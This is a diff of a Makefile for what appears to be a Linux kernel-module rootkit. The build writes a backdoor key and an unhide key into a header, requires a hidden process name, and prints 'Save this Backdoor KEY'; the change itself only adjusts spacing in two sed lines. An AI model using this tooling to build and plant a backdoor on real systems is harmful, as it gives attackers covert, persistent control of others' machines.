@@ -46,8 +46,8 @@ all:
 	# TODO: Check if we can generate a random PROCNAME, something like:
 	# PROCNAME ?= $(shell uuidgen | cut -c1-8)
 	$(if $(PROCNAME),,$(error ERROR: PROCNAME is not defined. Please invoke make with PROCNAME="your_process_name"))
-	@sed -i 's#^static uint64_t __attribute__((unused))auto_bdkey = .*#static uint64_t __attribute__((unused))auto_bdkey = $(BDKEY);#' src/auto.h
-	@sed -i 's#^static uint64_t __attribute__((unused))auto_unhidekey = .*#static uint64_t __attribute__((unused))auto_unhidekey = $(UNHIDEKEY);#' src/auto.h
+	@sed -i 's#^static uint64_t __attribute__((unused)) auto_bdkey = .*#static uint64_t __attribute__((unused)) auto_bdkey = $(BDKEY);#' src/auto.h
+	@sed -i 's#^static uint64_t __attribute__((unused)) auto_unhidekey = .*#static uint64_t __attribute__((unused)) auto_unhidekey = $(UNHIDEKEY);#' src/auto.h
 	make  -C  /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 	@echo -n "Save this Backdoor KEY: "
 	@echo $(BDKEY) | sed 's/^0x//'
